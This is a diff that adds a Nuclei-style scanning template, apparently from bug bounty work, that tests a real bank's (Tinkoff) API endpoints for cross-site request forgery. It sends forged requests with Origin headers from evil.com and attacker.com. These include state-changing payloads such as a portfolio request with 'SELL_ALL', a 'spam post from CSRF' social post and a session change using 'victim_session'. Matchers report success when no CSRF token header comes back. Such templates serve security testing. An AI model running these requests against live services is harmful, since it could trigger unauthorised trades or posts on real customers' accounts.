@@ -1,0 +1,66 @@
+id: tinkoff-csrf
+
+info:
+  name: Tinkoff - Cross-Site Request Forgery
+  author: bugbounty
+  severity: high
+  description: CSRF on critical API endpoints without proper token validation
+  tags: csrf,tinkoff
+
+http:
+  - raw:
+      - |
+        POST /api/common/v1/session_info HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Origin: https://evil.com
+
+        {"platform":"web","sessionid":"test"}
+
+      - |
+        POST /api/invest/portfolio/instruments/v2 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Origin: https://attacker.com
+        Referer: https://attacker.com/csrf.html
+
+        {"tickers":"SELL_ALL"}
+
+      - |
+        POST /api/invest-gw/social/v1/post HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Origin: https://evil.com
+
+        {"content":"spam post from CSRF"}
+
+      - |
+        PUT /api/common/v1/mobile_info HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Origin: https://attacker.com
+
+        {"platform":"android","sessionid":"victim_session"}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+          - 204
+
+      - type: word
+        part: body
+        words:
+          - "success"
+          - "updated"
+          - "created"
+        condition: or
+
+      - type: word
+        part: header
+        words:
+          - "X-CSRF-Token"
+          - "CSRF-Token"
+        negative: true
